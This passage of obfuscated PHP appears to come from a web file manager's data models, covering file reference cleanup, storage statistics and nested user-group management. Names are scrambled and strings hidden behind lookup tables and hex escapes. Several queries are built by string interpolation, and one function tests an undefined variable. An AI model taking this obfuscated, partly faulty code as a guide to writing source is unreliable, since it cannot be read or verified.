} foreach ($š´©Æïİ as $ßí‡„‰ => $äšƒ™¯Ö) { if (!$äšƒ™¯Ö) { continue; } $ßí‡„‰ = $äÅ×³ê ? $ßí‡„‰ : -intval($ßí‡„‰); $¡ï®ÄÁ§ = array($ì”À¦¶Ã[468] => array($ì”À¦¶Ã[7], $äšƒ™¯Ö)); if ($ßí‡„‰ < 0) { $¡ï®ÄÁ§[$ì”À¦¶Ã[1931]] = array($ì”À¦¶Ã[1022], abs($ßí‡„‰)); } $this->where($¡ï®ÄÁ§)->setAdd($ì”À¦¶Ã[1931], $ßí‡„‰); } } public function findByHash($¢û°šá, $ÓØ•¾£Ü = false) { $ÉÉÓ’†Œ =& $_SERVER[å¸¿•¶£]; if (!$¢û°šá && !$ÓØ•¾£Ü) { return !1; } $Ğ”ƒ²™ = array($ÉÉÓ’†Œ[1925] => $¢û°šá); if ($ÓØ•¾£Ü) { $Ğ”ƒ²™ = array($ÉÉÓ’†Œ[1926] => $ÓØ•¾£Ü); } return $this->order($ÉÉÓ’†Œ[1932])->where($Ğ”ƒ²™)->find(); } public function clearEmpty($§ï à¿ = 0) { $Ñ¿õ½ğÓ =& $_SERVER[å¸¿•¶£]; $‚ÒßÆçÕ = time() - 3600 * 24 * $§ï à¿; $‰öŞãÂğ = $Ñ¿õ½ğÓ[1933] . $‚ÒßÆçÕ; $é…ìƒõ = $this->where($‰öŞãÂğ)->select(); if (!$é…ìƒõ) { return; } $€¤ĞÈ½§ = new Task($Ñ¿õ½ğÓ[1934], $Ñ¿õ½ğÓ[12], count($é…ìƒõ)); foreach ($é…ìƒõ as $ÎÂ—š¢à) { $€¤ĞÈ½§->update(1); $this->resetFile($ÎÂ—š¢à); } $€¤ĞÈ½§->end(); } public function resetFile($à·èÍÒË) { $ÖÃíÅØë =& $_SERVER[å¸¿•¶£]; $µ’ôÑ¿ = array($ÖÃíÅØë[469] => $à·èÍÒË[$ÖÃíÅØë[468]]); $ÕÛĞñÕÏ = Model($ÖÃíÅØë[1346])->where($µ’ôÑ¿)->count(); $çâßÒÏâ = Model($ÖÃíÅØë[1935])->where($µ’ôÑ¿)->count(); $µ™Şó¸‹ = intval($ÕÛĞñÕÏ) + intval($çâßÒÏâ); if ($µ™Şó¸‹ == 0) { IO::remove($à·èÍÒË[$ÖÃíÅØë[84]]); Model($ÖÃíÅØë[1936])->delete($à·èÍÒË[$ÖÃíÅØë[468]]); $this->where($µ’ôÑ¿)->delete(); $this->metaSet($à·èÍÒË[$ÖÃíÅØë[468]], null, null); return; } if ($à·èÍÒË[$ÖÃíÅØë[1931]] != $µ™Şó¸‹) { $this->where($µ’ôÑ¿)->save(array($ÖÃíÅØë[1924] => $µ™Şó¸‹)); } } public function storageInfo($Ï·–× = false) { $ıİ²äÓ… =& $_SERVER[å¸¿•¶£]; $¯ğòÆŞ = $this->count() + 0.0; $—Ïé‰Ä = 0; $î™ˆæ­ = 1; $ÔÜ³¸ñ÷ = 0; $ã˜Ğ†± = 5000; for ($‰«‚”Òå = 0; $‰«‚”Òå < $¯ğòÆŞ; $‰«‚”Òå = $‰«‚”Òå + $ã˜Ğ†±) { $·ÉëŸõÏ = $this->limit($‰«‚”Òå, $‰«‚”Òå + $ã˜Ğ†±)->select(); foreach ($·ÉëŸõÏ as $Èñù¦¹) { $î™ˆæ­ += $Èñù¦¹[$ıİ²äÓ…[76]] * $Èñù¦¹[$ıİ²äÓ…[1931]]; $—Ïé‰Ä += $Èñù¦¹[$ıİ²äÓ…[76]] * ($Èñù¦¹[$ıİ²äÓ…[1931]] - 1); $ÔÜ³¸ñ÷ += $Èñù¦¹[$ıİ²äÓ…[1931]]; } } $ÎÉÇ¥­ = array($ıİ²äÓ…[1937] => $î™ˆæ­, $ıİ²äÓ…[1938] => $—Ïé‰Ä, $ıİ²äÓ…[1939] => $—Ïé‰Ä / $î™ˆæ­, $ıİ²äÓ…[80] => $¯ğòÆŞ, $ıİ²äÓ…[1940] => $ÔÜ³¸ñ÷); return $ÎÉÇ¥­; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\145" => "\147\x72\157\165\x70\x5f\x6d\x65\x74\141", "\x6d\x65\164\141\x46\151\145\154\x64" => "\x67\x72\157\165\160\x49\104"); protected function cacheFunctionAlias($ÆİÍåİº) { $£¡ë¦–½ =& $_SERVER[å¸¿•¶£]; return array($£¡ë¦–½[1941] => array($ÆİÍåİº[0], $£¡ë¦–½[1942]), $£¡ë¦–½[1943] => array($ÆİÍåİº[0], $£¡ë¦–½[1944])); } protected function getInfo($êø‡Šİš, $êÍÆËµ´ = false) { $ÜÔíÇÏ = $this->getInfoSimple($êø‡Šİš); if (!$ÜÔíÇÏ) { return !1; } if ($êÍÆËµ´) { return $this->_listDataApplyItem($ÜÔíÇÏ); } return $this->cacheFunctionGet($_SERVER[å¸¿•¶£][1945], $êø‡Šİš); } protected function getInfoSimple($Ì—¯îÉÂ, $ÉÜ ËÔı = false) { $†Òä«ê =& $_SERVER[å¸¿•¶£]; if ($ÉÜ ËÔı) { $ÚµøôŞİ = array($†Òä«ê[1863] => intval($Ì—¯îÉÂ)); $“Û‹Ãèñ = $this->where($ÚµøôŞİ)->find(); return is_array($“Û‹Ãèñ) ? $“Û‹Ãèñ : array(); } return $this->cacheFunctionGet($†Òä«ê[1946], $Ì—¯îÉÂ); } protected function groupAdd($Ğ•¤™¡ã) { $¨²¼ÇÊî =& $_SERVER[å¸¿•¶£]; if (!$Ğ•¤™¡ã[$¨²¼ÇÊî[432]] && isset($Ğ•¤™¡ã[$¨²¼ÇÊî[1863]]) && $Ğ•¤™¡ã[$¨²¼ÇÊî[1863]] == 1) { if ($˜®¼Á‰¥ = $this->getInfoSimple($Ğ•¤™¡ã[$¨²¼ÇÊî[1863]], !0)) { return $Ğ•¤™¡ã[$¨²¼ÇÊî[1863]]; } } else { $˜®¼Á‰¥ = $this->getInfoSimple($Ğ•¤™¡ã[$¨²¼ÇÊî[432]]); if (!$˜®¼Á‰¥) { return !1; } } $¬ãÛ„ˆ¼ = $¨²¼ÇÊî[521]; if ($˜®¼Á‰¥[$¨²¼ÇÊî[511]]) { $¬ãÛ„ˆ¼ = $˜®¼Á‰¥[$¨²¼ÇÊî[511]] . $˜®¼Á‰¥[$¨²¼ÇÊî[1863]] . $¨²¼ÇÊî[50]; } $ÓÛã¡‡¡ = array($¨²¼ÇÊî[420] => $this->groupNameAuto($Ğ•¤™¡ã[$¨²¼ÇÊî[432]], $Ğ•¤™¡ã[$¨²¼ÇÊî[32]]), $¨²¼ÇÊî[401] => $Ğ•¤™¡ã[$¨²¼ÇÊî[432]], $¨²¼ÇÊî[580] => $¬ãÛ„ˆ¼, $¨²¼ÇÊî[1947] => $Ğ•¤™¡ã[$¨²¼ÇÊî[1850]], $¨²¼ÇÊî[1948] => 0, $¨²¼ÇÊî[1867] => 0); if (isset($Ğ•¤™¡ã[$¨²¼ÇÊî[1887]])) { $ÓÛã¡‡¡[$¨²¼ÇÊî[1887]] = $Ğ•¤™¡ã[$¨²¼ÇÊî[1887]]; } else { $Š²•†† = $this->max($¨²¼ÇÊî[1887]); if (!$Š²•††) { $Š²•†† = 0; } $ÓÛã¡‡¡[$¨²¼ÇÊî[1887]] = $Š²•†† + 1; } if (!empty($Ğ•¤™¡ã[$¨²¼ÇÊî[1863]])) { $ÓÛã¡‡¡[$¨²¼ÇÊî[1863]] = $Ğ•¤™¡ã[$¨²¼ÇÊî[1863]]; } $€Ÿµ‡¸Ÿ = $this->add($ÓÛã¡‡¡); $this->setNamePinyin($€Ÿµ‡¸Ÿ, $ÓÛã¡‡¡[$¨²¼ÇÊî[32]]); if (isset($Ğ•¤™¡ã[$¨²¼ÇÊî[1949]])) { $this->metaSet($€Ÿµ‡¸Ÿ, array($¨²¼ÇÊî[1949] => $Ğ•¤™¡ã[$¨²¼ÇÊî[1949]], $¨²¼ÇÊî[1950] => $Ğ•¤™¡ã[$¨²¼ÇÊî[1950]])); unset($Ğ•¤™¡ã[$¨²¼ÇÊî[1949]]); unset($Ğ•¤™¡ã[$¨²¼ÇÊî[1950]]); } Model($¨²¼ÇÊî[1346])->groupRootAdd($€Ÿµ‡¸Ÿ); $this->_clearCache($Ğ•¤™¡ã[$¨²¼ÇÊî[432]]); return $€Ÿµ‡¸Ÿ; } protected function groupEdit($ö©¿È–ô, $¶ì‰½œŒ) { $Ôå§Ë²È =& $_SERVER[å¸¿•¶£]; $å³‚ÛşÇ = $this->getInfoSimple($ö©¿È–ô); if (!$å³‚ÛşÇ) { return !1; } if (!empty($¶ì‰½œŒ[$Ôå§Ë²È[432]])) { $  Ë§­ = $this->getInfoSimple($¶ì‰½œŒ[$Ôå§Ë²È[432]]); if (!$  Ë§­) { return !1; } if ($å³‚ÛşÇ[$Ôå§Ë²È[1863]] == $  Ë§­[$Ôå§Ë²È[1863]]) { return !1; } if ($¶ì‰½œŒ[$Ôå§Ë²È[432]] != $å³‚ÛşÇ[$Ôå§Ë²È[432]]) { if ($  Ë§­[$Ôå§Ë²È[511]] !== $å³‚ÛşÇ[$Ôå§Ë²È[511]] && strpos($  Ë§­[$Ôå§Ë²È[511]], $å³‚ÛşÇ[$Ôå§Ë²È[511]] . $å³‚ÛşÇ[$Ôå§Ë²È[1863]] . $Ôå§Ë²È[50]) === 0) { return !1; } $¶ì‰½œŒ[$Ôå§Ë²È[580]] = $  Ë§­[$Ôå§Ë²È[511]] . $¶ì‰½œŒ[$Ôå§Ë²È[432]] . $Ôå§Ë²È[50]; $this->_changeChildLevel($å³‚ÛşÇ, $  Ë§­); $this->_clearCache($  Ë§­[$Ôå§Ë²È[1863]]); $this->_clearCache($å³‚ÛşÇ[$Ôå§Ë²È[432]]); } } if (isset($¶ì‰½œŒ[$Ôå§Ë²È[32]])) { $this->setNamePinyin($ö©¿È–ô, $¶ì‰½œŒ[$Ôå§Ë²È[32]]); } if (isset($¶ì‰½œŒ[$Ôå§Ë²È[1949]])) { $this->metaSet($ö©¿È–ô, array($Ôå§Ë²È[1949] => $¶ì‰½œŒ[$Ôå§Ë²È[1949]], $Ôå§Ë²È[1950] => $¶ì‰½œŒ[$Ôå§Ë²È[1950]])); unset($¶ì‰½œŒ[$Ôå§Ë²È[1949]]); unset($¶ì‰½œŒ[$Ôå§Ë²È[1950]]); } $this->_clearChildrenCache($å³‚ÛşÇ); return $this->where(array($Ôå§Ë²È[1951] => $ö©¿È–ô))->save($¶ì‰½œŒ); } private function _clearChildrenCache($È¥¸¼Ã÷) { $¤¢ºÁé• =& $_SERVER[å¸¿•¶£]; $Óºï±µÕ = array($¤¢ºÁé•[580] => array($¤¢ºÁé•[540], $È¥¸¼Ã÷[$¤¢ºÁé•[511]] . $È¥¸¼Ã÷[$¤¢ºÁé•[1863]] . $¤¢ºÁé•[541])); $‡ûò—×‰ = $this->field($¤¢ºÁé•[1863])->where($Óºï±µÕ)->select(); foreach ($‡ûò—×‰ as $‹ÖĞõÏõ) { $this->_clearCache($‹ÖĞõÏõ[$¤¢ºÁé•[1863]]); } } private function _clearCache($œä¨û„) { $ÅƒıÒ¤ =& $_SERVER[å¸¿•¶£]; $this->cacheFunctionClear($ÅƒıÒ¤[1945], $œä¨û„); $this->cacheFunctionClear($ÅƒıÒ¤[1946], $œä¨û„); } private function _changeChildLevel($µ¨ø–á, $­Áã­µ, $¤¾Œß‘û = false) { $ó«¸Ì®é =& $_SERVER[å¸¿•¶£]; $ó¤‹€ÀÉ = $µ¨ø–á[$ó«¸Ì®é[511]] . $µ¨ø–á[$ó«¸Ì®é[1863]] . $ó«¸Ì®é[50]; $ÏÓì±ñ˜ = $­Áã­µ[$ó«¸Ì®é[511]] . $­Áã­µ[$ó«¸Ì®é[1863]] . $ó«¸Ì®é[50] . $µ¨ø–á[$ó«¸Ì®é[1863]] . $ó«¸Ì®é[50]; if ($¤¾Œß‘û) { $ÏÓì±ñ˜ = $­Áã­µ[$ó«¸Ì®é[511]] . $­Áã­µ[$ó«¸Ì®é[1863]] . $ó«¸Ì®é[50]; } $‰÷öÎÌÉ = array($ó«¸Ì®é[580] => array($ó«¸Ì®é[540], $µ¨ø–á[$ó«¸Ì®é[511]] . $µ¨ø–á[$ó«¸Ì®é[1863]] . $ó«¸Ì®é[541])); $×ñ èüÃ = array($ó«¸Ì®é[580] => array($ó«¸Ì®é[589], "\162\x65\x70\154\141\x63\x65\x28\x70\x61\x72\145\x6e\164\x4c\x65\166\145\x6c\x2c\47{$ó¤‹€ÀÉ}\47\54\x27{$ÏÓì±ñ˜}\47\51")); $this->_clearChildrenCache($µ¨ø–á); $this->where($‰÷öÎÌÉ)->data($×ñ èüÃ)->save(); } public function setNamePinyin($ñ•Š—Ó, $€³õ¬ˆÄ = false) { $è±ğä› =& $_SERVER[å¸¿•¶£]; if (!$€³õ¬ˆÄ) { $íê¼Ñ¶¡ = $this->getInfoSimple($ñ•Š—Ó); $€³õ¬ˆÄ = $íê¼Ñ¶¡[$è±ğä›[32]]; } if (!Input::check($€³õ¬ˆÄ, $è±ğä›[583])) { $this->metaSet($ñ•Š—Ó, $è±ğä›[465], null); $this->metaSet($ñ•Š—Ó, $è±ğä›[464], null); return; } $¥ÈÑè·ú = array($è±ğä›[465] => str_replace($è±ğä›[53], $è±ğä›[12], Pinyin::get($€³õ¬ˆÄ)), $è±ğä›[464] => Pinyin::get($€³õ¬ˆÄ, $è±ğä›[584])); $this->metaSet($ñ•Š—Ó, $¥ÈÑè·ú); } protected function groupStatus($ş»¯ÀÊİ, $’˜©¾–) { $¶•§•îÓ =& $_SERVER[å¸¿•¶£]; $Óûò€¯ô = $this->getInfoSimple($ş»¯ÀÊİ); if (!$Óûò€¯ô) { return !1; } if ($’˜©¾– == $¶•§•îÓ[88]) { $ì¡º’‚Ñ = $this->parentLevelArray($Óûò€¯ô[$¶•§•îÓ[511]]); } else { $”Ó•»‰‚ = array($¶•§•îÓ[580] => array($¶•§•îÓ[540], $Óûò€¯ô[$¶•§•îÓ[511]] . $Óûò€¯ô[$¶•§•îÓ[1863]] . $¶•§•îÓ[541])); $ì¡º’‚Ñ = $this->where($”Ó•»‰‚)->field($¶•§•îÓ[1863])->select(); $ì¡º’‚Ñ = array_to_keyvalue($ì¡º’‚Ñ, $¶•§•îÓ[12], $¶•§•îÓ[1863]); } $ì¡º’‚Ñ[] = $Óûò€¯ô[$¶•§•îÓ[1863]]; $‡ÌÕË Ù = array(); foreach ($ì¡º’‚Ñ as $ş»¯ÀÊİ) { $‡ÌÕË Ù[] = array($¶•§•îÓ[1863] => $ş»¯ÀÊİ, $¶•§•îÓ[94] => $¶•§•îÓ[756], $¶•§•îÓ[374] => $’˜©¾–); $this->_clearCache($ş»¯ÀÊİ); } return Model($¶•§•îÓ[1952])->addAll($‡ÌÕË Ù, array(), !0); } protected function groupRemove($¡ø“ôèô, $«ŒĞ¼ÓŞ = false) { $ÔÒë‡ƒë =& $_SERVER[å¸¿•¶£]; $×À»¯õÀ = array($ÔÒë‡ƒë[1863] => $¡ø“ôèô); $áÖ·»ª = $this->where($×À»¯õÀ)->find(); if (!$áÖ·»ª || $áÖ·»ª[$ÔÒë‡ƒë[432]] == 0) { return !1; } if (!$«ŒĞ¼ÓŞ) { $ÃŸöè²¦ = $this->getInfoSimple($áÖ·»ª[$ÔÒë‡ƒë[432]]); $this->_changeChildLevel($áÖ·»ª, $ÃŸöè²¦, !0); $this->where(array($ÔÒë‡ƒë[432] => $¡ø“ôèô))->save(array($ÔÒë‡ƒë[432] => $áÖ·»ª[$ÔÒë‡ƒë[432]])); $this->_clearCache($ÃŸöè²¦[$ÔÒë‡ƒë[1863]]); } Model($ÔÒë‡ƒë[1952])->where($×À»¯õÀ)->delete(); Model($ÔÒë‡ƒë[1953])->where($×À»¯õÀ)->delete(); Model($ÔÒë‡ƒë[832])->groupRootRemove($¡ø“ôèô); $this->_clearCache($áÖ·»ª[$ÔÒë‡ƒë[432]]); return $this->where($×À»¯õÀ)->delete(); } protected function groupSort($ì¬¬™å¦) { $İ¤û¨‹² =& $_SERVER[å¸¿•¶£]; $º×¿ôƒ = array(); foreach ($ì¬¬™å¦ as $í›ÙÕ”— => $«êéƒ¯) { $º×¿ôƒ[] = array($İ¤û¨‹²[1863], $«êéƒ¯, $İ¤û¨‹²[1887], $í›ÙÕ”— + 1); } $this->saveAll($º×¿ôƒ); } public function listData() { $‰Š€Ñ¹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‰Š€Ñ¹[$_SERVER[å¸¿•¶£][369]]); return $‰Š€Ñ¹; } private function _makeOrder($Ù±É„— = '') { $ÃË§ãôû =& $_SERVER[å¸¿•¶£]; $Ã‚ş©•í = array($ÃË§ãôû[1863], $ÃË§ãôû[32], $ÃË§ãôû[1852], $ÃË§ãôû[201]); $Å–µãñ‘ = array($ÃË§ãôû[450] => $ÃË§ãôû[451], $ÃË§ãôû[452] => $ÃË§ãôû[453]); $ºà‰ÎÎ = Input::get($ÃË§ãôû[457], $ÃË§ãôû[7], $ÃË§ãôû[1867], $Ã‚ş©•í); $á¡ÒµÈ¼ = Input::get($ÃË§ãôû[458], $ÃË§ãôû[7], $ÃË§ãôû[1954], array($ÃË§ãôû[1954], $ÃË§ãôû[452])); $á¡ÒµÈ¼ = $Å–µãñ‘[$á¡ÒµÈ¼]; $Ù±É„— = $Ù±É„— . "{$ºà‰ÎÎ}\x20{$á¡ÒµÈ¼}\x2c\x20\147\x72\157\165\x70\111\104\40\141\163\143"; return $this->order($Ù±É„—); } public function listChild($¸ÄË«æ) { $©áéĞÓ’ =& $_SERVER[å¸¿•¶£]; $®³ĞššĞ = $this->where(array($©áéĞÓ’[432] => $¸ÄË«æ))->_makeOrder()->selectPage(200); $this->_listDataApply($®³ĞššĞ[$©áéĞÓ’[369]]); return $®³ĞššĞ; } public function listChildIds($ÔõßãŒ ) { $İ†ïˆú‘ =& $_SERVER[å¸¿•¶£]; if (is_string($é“¯¯ßË)) { $ÔõßãŒ  = explode($İ†ïˆú‘[50], $ÔõßãŒ ); } $¬â¥™‚Û = $this->where(array($İ†ïˆú‘[1863] => array($İ†ïˆú‘[7], $ÔõßãŒ )))->field($İ†ïˆú‘[1955])->select(); if (!$¬â¥™‚Û) { return !1; } $Ÿ¿”ĞœŒ = array(); foreach ($¬â¥™‚Û as $”­³‚Ø“) { $Ÿ¿”ĞœŒ[] = "\163\x65\154\145\x63\x74\x20\147\162\x6f\x75\160\x49\104\x20\x66\x72\157\155\x20\x60\147\x72\x6f\x75\160\140\40\167\150\x65\162\x65\40\x70\x61\x72\x65\x6e\164\114\x65\x76\145\154\x20\x6c\151\153\x65\40\47{$”­³‚Ø“[$İ†ïˆú‘[511]]}{$”­³‚Ø“[$İ†ïˆú‘[1863]]}\54\45\47"; } $Ÿ¿”ĞœŒ = implode($İ†ïˆú‘[1956], $Ÿ¿”ĞœŒ); $¬â¥™‚Û = $this->query($Ÿ¿”ĞœŒ); if (!$¬â¥™‚Û) { return array(); } $ÔõßãŒ  = array_to_keyvalue($¬â¥™‚Û, $İ†ïˆú‘[12], $İ†ïˆú‘[1863]); return array_unique($ÔõßãŒ ); } public function listByID($º€««ˆê) { $ñò±ÃŞ™ =& $_SERVER[å¸¿•¶£]; if (!$º€««ˆê) { return array(); } $Ú®¤½°Ó = array($ñò±ÃŞ™[1863] => array($ñò±ÃŞ™[7], $º€««ˆê)); $¤Ú†šÂ = $this->where($Ú®¤½°Ó)->select(); $¤Ú†šÂ = array_sort_keep($¤Ú†šÂ, $ñò±ÃŞ™[1863], $º€««ˆê); $this->_listDataApply($¤Ú†šÂ); return $¤Ú†šÂ; } public function listSearch($‡ØşãÇ“) { $¯Ôê’ş³ =& $_SERVER[å¸¿•¶£]; $ê•Ÿ÷¤¤ = $‡ØşãÇ“[$¯Ôê’ş³[1957]]; $ ‰ûâ¦¸ = isset($‡ØşãÇ“[$¯Ôê’ş³[1958]]) ? $‡ØşãÇ“[$¯Ôê’ş³[1958]] : !1; if (!trim($ê•Ÿ÷¤¤)) { return !1; } $ê•Ÿ÷¤¤ = str_replace($¯Ôê’ş³[1959], $¯Ôê’ş³[1960], $ê•Ÿ÷¤¤); $ÙÃ´€Ÿ = array($¯Ôê’ş³[1863] => array($¯Ôê’ş³[383], "{$ê•Ÿ÷¤¤}\x25"), $¯Ôê’ş³[32] => array($¯Ôê’ş³[383], "\x25{$ê•Ÿ÷¤¤}\x25"), $¯Ôê’ş³[1007] => $¯Ôê’ş³[1961]); if ($ ‰ûâ¦¸) { $«›Ş½™˜ = $this->getInfoSimple($ ‰ûâ¦¸); $şò÷‚¤µ = $«›Ş½™˜[$¯Ôê’ş³[511]] . $ ‰ûâ¦¸ . $¯Ôê’ş³[541]; $ÙÃ´€Ÿ = array($ÙÃ´€Ÿ, array($¯Ôê’ş³[511] => array($¯Ôê’ş³[383], $şò÷‚¤µ))); } $ÙÃ´€Ÿ = $this->parseWhereLike($ÙÃ´€Ÿ); $’¼‚Ä = $this->_makeOrder()->where($ÙÃ´€Ÿ)->selectPage(20); $’¼‚Ä = $’¼‚Ä ? $’¼‚Ä : array($¯Ôê’ş³[369] => array(), $¯Ôê’ş³[366] => array()); if (!$’¼‚Ä || count($’¼‚Ä[$¯Ôê’ş³[369]]) < 5 && Input::check($ê•Ÿ÷¤¤, $¯Ôê’ş³[318])) { $›Î°Û•İ = $this->groupChildrenAll($ ‰ûâ¦¸); $Şó°ú‚¹ = $this->_searchFromMeta($¯Ôê’ş³[464], $ê•Ÿ÷¤¤, 10, $›Î°Û•İ); $š¡œÁÑ£ = $this->_searchFromMeta($¯Ôê’ş³[465], $ê•Ÿ÷¤¤, 10, $›Î°Û•İ); $şöªœ™ñ = array_merge($Şó°ú‚¹, $š¡œÁÑ£, $’¼‚Ä[$¯Ôê’ş³[369]]); $’¼‚Ä[$¯Ôê’ş³[369]] = array_unique_by_key($şöªœ™ñ, $¯Ôê’ş³[1863]); $’¼‚Ä[$¯Ôê’ş³[366]][$¯Ôê’ş³[367]] = count($’¼‚Ä[$¯Ôê’ş³[369]]); $’¼‚Ä[$¯Ôê’ş³[366]][$¯Ôê’ş³[368]] = ceil($’¼‚Ä[$¯Ôê’ş³[366]][$¯Ôê’ş³[367]] / $’¼‚Ä[$¯Ôê’ş³[366]][$¯Ôê’ş³[363]]); } $this->_listDataApply($’¼‚Ä[$¯Ôê’ş³[369]]); return $’¼‚Ä; } protected function groupChildrenAll($Óò…Ôí¹) { $×ŒİÈ“ö =& $_SERVER[å¸¿•¶£]; if (!$Óò…Ôí¹) { return !1; } if (is_string($Óò…Ôí¹)) { $Óò…Ôí¹ = array($Óò…Ôí¹); } $£şßç = $Óò…Ôí¹; foreach ($Óò…Ôí¹ as $“¯ãìíÄ) { $®Æ¸£¡ã = $this->getInfoSimple($“¯ãìíÄ); $›Úâ¨ = array($×ŒİÈ“ö[511] => array($×ŒİÈ“ö[383], $®Æ¸£¡ã[$×ŒİÈ“ö[511]] . $“¯ãìíÄ . $×ŒİÈ“ö[541])); $«§Ÿ”ñ = $this->field($×ŒİÈ“ö[1863])->where($›Úâ¨)->select(); $£şßç = array_merge($£şßç, array_to_keyvalue($«§Ÿ”ñ, $×ŒİÈ“ö[12], $×ŒİÈ“ö[1863])); } return array_unique($£şßç); } private function _searchFromMeta($íòÏòö, $œÁƒÔ°, $ìõâ¬«Œ, $»Æö¸ä÷) { $÷Îäæç¡ =& $_SERVER[å¸¿•¶£]; $œÁƒÔ° = strtolower($œÁƒÔ°); $×ôŒ¥ñ = array($÷Îäæç¡[94] => $íòÏòö, $÷Îäæç¡[374] => array($÷Îäæç¡[383], "\x25{$œÁƒÔ°}\45")); $×ôŒ¥ñ = $this->parseWhereLike($×ôŒ¥ñ); if ($»Æö¸ä÷) { $×ôŒ¥ñ[$÷Îäæç¡[1863]] = array($÷Îäæç¡[7], $»Æö¸ä÷); } $ÍÀİŞÒ‘ = Model($÷Îäæç¡[1962])->where($×ôŒ¥ñ)->limit($ìõâ¬«Œ)->select(); if (!$ÍÀİŞÒ‘) { return array(); } $ÍÀİŞÒ‘ = array_to_keyvalue($ÍÀİŞÒ‘, $÷Îäæç¡[12], $÷Îäæç¡[1863]); $Ù™—ØéÏ = $this->where(array($÷Îäæç¡[1951] => array($÷Îäæç¡[7], $ÍÀİŞÒ‘)))->select(); if (!$Ù™—ØéÏ) { return array(); } return $Ù™—ØéÏ; } protected function _listDataApplyItem($í‰°×Â„) { $Õˆáö´Ç = array($í‰°×Â„); $this->_listDataApply($Õˆáö´Ç); return $Õˆáö´Ç[0]; } protected function _listDataApply(&$²ÈÀÛäò) { $”Â¥Óã‘ =& $_SERVER[å¸¿•¶£]; if (!$²ÈÀÛäò) { return; } $Ë“è”ğÚ = array_to_keyvalue($²ÈÀÛäò, $”Â¥Óã‘[12], $”Â¥Óã‘[1863]); $this->_listAppendChildren($²ÈÀÛäò); $this->_listAppendChildrenMember($²ÈÀÛäò); $this->_listAppendMeta($²ÈÀÛäò, $Ë“è”ğÚ); $this->_listAppendParent($²ÈÀÛäò); $this->_listAppendSourceRoot($²ÈÀÛäò, $Ë“è”ğÚ); } private function _listAppendChildren(&$®ÙÉ·±‘) { $ùÖ«Ïİú =& $_SERVER[å¸¿•¶£]; $ƒô™©ó = array_to_keyvalue($®ÙÉ·±‘, $ùÖ«Ïİú[12], $ùÖ«Ïİú[1863]); $“İæıçæ = array($ùÖ«Ïİú[432] => array($ùÖ«Ïİú[7], $ƒô™©ó)); $ñª£îùª = array($ùÖ«Ïİú[432], $ùÖ«Ïİú[1963] => $ùÖ«Ïİú[491]); $Ç²ìö›€ = $this->field($ñª£îùª)->where($“İæıçæ)->group($ùÖ«Ïİú[432])->select(); $¥ğ–ÜğÎ = array_to_keyvalue($Ç²ìö›€, $ùÖ«Ïİú[432], $ùÖ«Ïİú[491]); foreach ($®ÙÉ·±‘ as &$§·ÜÆá) { $Ù¼·ÉÉ = $§·ÜÆá[$ùÖ«Ïİú[1863]]; $§·ÜÆá[$ùÖ«Ïİú[1964]] = isset($¥ğ–ÜğÎ[$Ù¼·ÉÉ]) ? intval($¥ğ–ÜğÎ[$Ù¼·ÉÉ]) : !1; } unset($§·ÜÆá); } private function _listAppendChildrenMember(&$¸œ£»¼³) { $³ıñ™¥ü =& $_SERVER[å¸¿•¶£]; $ƒşû¹³˜ = array_to_keyvalue($¸œ£»¼³, $³ıñ™¥ü[12], $³ıñ™¥ü[1863]); $´¬–Ò¿ª = array($³ıñ™¥ü[1863] => array($³ıñ™¥ü[7], $ƒşû¹³˜)); $ìÆßš÷ã = array($³ıñ™¥ü[1863], $³ıñ™¥ü[1963] => $³ıñ™¥ü[491]); $şÁ±íÚ˜ = Model($³ıñ™¥ü[1953])->field($ìÆßš÷ã)->where($´¬–Ò¿ª)->group($³ıñ™¥ü[1863])->select(); $•Ãô”©ã = array_to_keyvalue($şÁ±íÚ˜, $³ıñ™¥ü[1863], $³ıñ™¥ü[491]); foreach ($¸œ£»¼³ as &$ü¡Üò“) { $«œ¤Í¡› = $ü¡Üò“[$³ıñ™¥ü[1863]]; $ü¡Üò“[$³ıñ™¥ü[1965]] = isset($•Ãô”©ã[$«œ¤Í¡›]) ? intval($•Ãô”©ã[$«œ¤Í¡›]) : !1; } unset($ü¡Üò“); } private function _listAppendMeta(&$ıÆù½û, $ƒ¼ë»¼›) { $Ã–şë“î =& $_SERVER[å¸¿•¶£]; $‹Œ±§¿ = array($Ã–şë“î[1863] => array($Ã–şë“î[7], $ƒ¼ë»¼›)); $É÷é†€ = Model($Ã–şë“î[1952])->where($‹Œ±§¿)->select(); $É÷é†€ = array_to_keyvalue_group($É÷é†€, $Ã–şë“î[1863]); foreach ($É÷é†€ as &$£¯ŞßÄ) { $£¯ŞßÄ = array_to_keyvalue($£¯ŞßÄ, $Ã–şë“î[94], $Ã–şë“î[374]); } unset($£¯ŞßÄ); foreach ($ıÆù½û as &$çê©õÑ½) { $çê©õÑ½[$Ã–şë“î[466]] = array(); if (isset($É÷é†€[$çê©õÑ½[$Ã–şë“î[1863]]])) { $çê©õÑ½[$Ã–şë“î[466]] = $É÷é†€[$çê©õÑ½[$Ã–şë“î[1863]]]; } } unset($çê©õÑ½); } protected function parentLevelArray($Ú–›ë¦ì) { $ÙÉ’ÃÒæ =& $_SERVER[å¸¿•¶£]; $Ú–›ë¦ì = explode($ÙÉ’ÃÒæ[50], trim($Ú–›ë¦ì, $ÙÉ’ÃÒæ[50])); $Ú–›ë¦ì = array_remove_value($Ú–›ë¦ì, $ÙÉ’ÃÒæ[198]); return $Ú–›ë¦ì; } protected function parentInGroup($µ‹·š–, $Á¼Ö¯ ) { $ÑƒğÄ‡É =& $_SERVER[å¸¿•¶£]; $Û¹ÛÙª± = $this->getInfoSimple($µ‹·š–); if (!$Û¹ÛÙª±) { return !0; } $Û”ßÖ = $this->parentLevelArray($Û¹ÛÙª±[$ÑƒğÄ‡É[511]]); $Û”ßÖ[] = $µ‹·š–; foreach ($Û”ßÖ as $µ‹·š–) { if (in_array($µ‹·š– . $ÑƒğÄ‡É[12], $Á¼Ö¯ )) { return !0; } } return !1; } private function _listAppendParent(&$¶¹¥ÔÎ¢) { $†œÇ› =& $_SERVER[å¸¿•¶£]; $Ÿº›Çö = array(); foreach ($¶¹¥ÔÎ¢ as &$í±ıÈ³ş) { $Ÿº›Çö[$í±ıÈ³ş[$†œÇ›[1863]]] = $í±ıÈ³ş[$†œÇ›[32]]; $¸¶‡¤ñš = $this->parentLevelArray($í±ıÈ³ş[$†œÇ›[511]]); foreach ($¸¶‡¤ñš as $„â©î€æ) { if (!isset($Ÿº›Çö[$„â©î€æ])) { 